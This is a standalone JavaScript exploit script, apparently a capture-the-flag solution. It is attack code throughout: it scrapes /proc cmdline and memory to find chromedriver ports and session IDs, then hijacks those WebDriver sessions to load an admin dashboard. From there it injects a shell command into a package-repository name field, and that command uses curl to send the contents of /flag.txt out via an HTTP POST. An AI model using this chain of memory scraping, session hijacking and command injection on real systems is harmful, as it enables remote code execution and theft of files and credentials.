(async () => {
  const userCookie = decodeURIComponent((document.currentScript.src.split("#")[1] || ""));
  const proc = "/profile/proc/";
  const enc = encodeURIComponent;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const post = (text) => fetch("/edit", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "title=stage&content=" + enc(text.replace(/[^A-Za-z0-9 !.:()]/g, " "))
  });

  const read = async (path) => {
    try {
      const r = await fetch(path);
      return r.status === 200 ? await r.text() : "";
    } catch {
      return "";
    }
  };

  await post("driver start");

  const drivers = [];
  for (let base = 1; base < 12000; base += 80) {
    await Promise.all([...Array(80)].map(async (_, k) => {
      const pid = base + k;
      const cmd = await read(proc + pid + "/cmdline%3f");
      const m = cmd.includes("chromedriver") && cmd.match(/--port=(\d+)/);
      if (m) {
        drivers.push([pid, m[1]]);
      }
    }));
  }

  await post("drivers " + drivers.length);

  const sessions = [];
  for (const [pid, port] of drivers) {
    const maps = await read(proc + pid + "/maps%3f");
    for (const line of maps.split("\n")) {
      const parts = line.split(/ +/);
      if (!parts[1] || !parts[1].startsWith("rw")) {
        continue;
      }

      const [start, end] = parts[0].split("-").map((x) => parseInt(x, 16));
      if (end - start > 0x2000000) {
        continue;
      }

      for (let off = start; off < end; off += 1500) {
        const data = await read(proc + pid + "/mem%3f?offset=0x" + off.toString(16) + "&limit=1500");
        for (const m of data.matchAll(/[a-f0-9]{32}/g)) {
          sessions.push([port, m[0]]);
        }
      }
    }
  }

  await post("sessions " + sessions.length);

  const cmd = "curl -s --max-time 5 -X POST http://app/edit -H " +
    JSON.stringify("Cookie: " + userCookie) +
    " --data title=flag --data-urlencode content=$(python3 -c 'print(open(\"/flag.txt\",\"rb\").read().hex())')";

  const adminStage = `
    (async () => {
      const f = new FormData();
      f.append("__csrf__", document.querySelector("meta[name=csrf]").content);
      f.append("__json__", JSON.stringify({
        platform: "gitlab",
        name: "--bad;${cmd};#",
        repositoryUrl: "https://gitlab.com/dev-ittechca-com/composer",
        branch: "master"
      }));
      await fetch("/_api/package-manager/add-repository", { method: "POST", body: f });
    })()
  `;

  const helper = open("about:blank", "h");
  helper.sessions = sessions;
  helper.adminStage = adminStage;
  helper.eval(`
    (async () => {
      for (const [port, sid] of sessions) {
        fetch("http://localhost:" + port + "/session/" + sid + "/url", {
          method: "POST",
          mode: "no-cors",
          body: JSON.stringify({ url: "http://admin-app/dashboard/setup" })
        });
      }

      await new Promise((r) => setTimeout(r, 3000));

      for (const [port, sid] of sessions) {
        fetch("http://localhost:" + port + "/session/" + sid + "/execute/sync", {
          method: "POST",
          mode: "no-cors",
          body: JSON.stringify({ script: adminStage, args: [] })
        });
      }
    })()
  `);
})();
